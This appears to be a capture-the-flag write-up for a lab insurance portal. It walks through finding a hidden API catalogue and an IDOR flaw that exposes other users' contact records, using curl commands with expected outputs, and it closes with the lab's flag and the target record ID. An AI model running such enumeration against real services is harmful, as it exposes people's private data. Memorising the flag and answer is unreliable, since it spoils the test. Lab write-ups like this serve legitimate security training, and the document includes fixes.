# Aegis Flex — Hidden Service Catalogue + Contact IDOR

## What Is Happening

Aegis Flex is an insurance quote portal. After login, the dashboard loads a **templated service catalogue** from `/apiendpoints/{subApp}/serviceConfigs.json` and renders widgets from the returned proxy paths.

The **dashboard** catalogue lists policy, claims, documents, and statements APIs. It does **not** list the contact service. The contact proxy path is only present in the **aegis** catalogue (`/apiendpoints/aegis/serviceConfigs.json`), which the dashboard never loads.

The catalogue documents `contactSubResource` but not the `type` query parameter. Only `type=phone` returns a `flag` field. The contact service also lacks object-level authorization — any authenticated user can read any application ARN.

## Why It Happens

```javascript
// app.bundle.js — sub-app from URL suffix
function g() {
  return window.location.href.endsWith("/aegis/pib#/") ||
         window.location.href.endsWith("/aegis/flexi#/")
    ? "aegis" : "dashboard";
}
fetch("/apiendpoints/" + g() + "/serviceConfigs.json");
```

On `/dashboard`, only the dashboard catalogue loads. Contact paths are not hardcoded in the bundle — they come from fetched config under `shieldapi.contactInformation`. Grepping the bundle for the contact hostname finds nothing; the bug is in what the **catalogue omits** (service presence + `type=phone` semantics).

The contact widget (aegis sub-app only) calls `type=summary`, which returns minimal data and never surfaces `flag`.

## Exploit Chain

1. Log in as `demo/demo`.
2. Fetch hidden catalogue: `GET /apiendpoints/aegis/serviceConfigs.json`.
3. Build contact URL from `shieldapi.contactInformation` + `contactSubResource`.
4. Request `?type=phone` (undocumented in catalogue).
5. Enumerate application ARNs (IDOR) or target Mira Patel from notification n-3 ("application finalised").
6. Read `flag` from finalised application record.

## Exact Test

```bash
BASE="https://89aacd38eb6c.pwnbox-lab.com"

# Login
curl -sS -c /tmp/aegis.cj -X POST "$BASE/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"demo","password":"demo"}'

# Hidden catalogue (not loaded by dashboard)
curl -sS -b /tmp/aegis.cj "$BASE/apiendpoints/aegis/serviceConfigs.json"

# Contact with undocumented type=phone — Mira Patel (finalised)
curl -sS -b /tmp/aegis.cj \
  "$BASE/aegis-contact-service-stg05-proxy/v6/applications/1743465601904/involved-parties/contacts?type=phone"
```

Control — own draft application returns null flag:

```bash
curl -sS -b /tmp/aegis.cj \
  "$BASE/aegis-contact-service-stg05-proxy/v6/applications/1743465601777/involved-parties/contacts?type=phone"
# -> "flag": null
```

Discover supported types via invalid value:

```bash
curl -sS -b /tmp/aegis.cj \
  "$BASE/aegis-contact-service-stg05-proxy/v6/applications/1743465601777/involved-parties/contacts?type=full"
# -> {"error":"unsupported contact type","supported":["summary","email","phone"]}
```

## Expected Signal

- Dashboard catalogue has no `shieldapi` or contact paths.
- Aegis catalogue exposes `contactInformation` and `contactSubResource`.
- `type=summary` / `type=email` omit or minimize sensitive fields.
- `type=phone` includes `"flag"` key.
- Draft apps (Jordan Demo) → `"flag": null`.
- Finalised apps (Mira Patel, per notification) → `"flag": "pwnbox{...}"`.
- Other users' ARNs return 200 with full contact data (IDOR).

## Result Interpretation

```text
Dashboard catalogue omits contact service
-> aegis catalogue still reachable directly
-> catalogue omits type=phone semantics
-> phone type leaks flag field
-> no ARN ownership check
-> enumerate or target hinted user (Mira)
-> read flag from finalised application
```

## Impact

- Sensitive token/flag disclosure via undocumented API parameter.
- Horizontal read of all contact records by ARN enumeration.
- Catalogue omission provides no real access control.

## Fix

- Authorize contact reads against session-bound application ownership.
- Strip `flag` from external contact API; use internal-only route.
- Document and enforce allowed `type` values server-side.
- Rate-limit ARN enumeration; return generic 404 for unauthorized ARNs.

## Flag

`pwnbox{c1d0a9f8e7b6453221098a7b6c5d4e3f}`

**Mira Patel ARN:** `1743465601904`
